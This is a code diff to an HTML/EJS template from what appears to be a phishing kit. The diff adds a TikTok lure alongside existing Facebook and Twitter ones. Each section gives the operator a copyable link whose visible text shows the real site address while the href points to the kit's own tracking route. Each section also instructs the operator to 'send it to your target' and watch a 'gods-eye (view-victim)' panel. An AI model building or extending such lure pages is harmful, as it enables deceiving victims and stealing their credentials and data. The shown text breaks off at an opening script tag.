@@ -1,9 +1,10 @@
 <div class="content-inner">
+
+    <!-- THIS IS FOR FACEBOOK  -->
     <div class="facebook">
         <div class="icon">
             <i class="fa-brands fa-facebook"></i>
         </div>
-
         <!-- Copy URL Button -->
         <div class="url">
             <button onclick="copyURL('/facebook?userId=<%= userId %>')">
@@ -11,20 +12,15 @@
             </button>
             <a href="/facebook?userId=<%= userId %>">https://www.facebook.com</a>
         </div>
-
-        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
     </div>
 
-
-
-
-
-
+    
+    <!-- THIS IS FOR TWITTER  -->
     <div class="twitter">
         <div class="icon">
             <i class="fa-brands fa-x-twitter"></i>
         </div>
-
         <!-- Copy URL Button -->
         <div class="url">
             <button onclick="copyURL('/twitter?userId=<%= userId %>')">
@@ -32,9 +28,25 @@
             </button>
             <a href="/twitter?userId=<%= userId %>">https://www.twitter.com</a>
         </div>
-
-        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
     </div>
+
+
+    <!-- THIS IS FOR TIKTOK -->
+    <div class="tiktok">
+        <div class="icon">
+            <i class="fa-brands fa-tiktok"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/tiktok?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy TikTok URL
+            </button>
+            <a href="/tiktok?userId=<%= userId %>">https://www.tiktok.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target; when the target hits it, check your gods-eye (view-victim).</p>
+    </div>
+
 </div>
 
 <script>
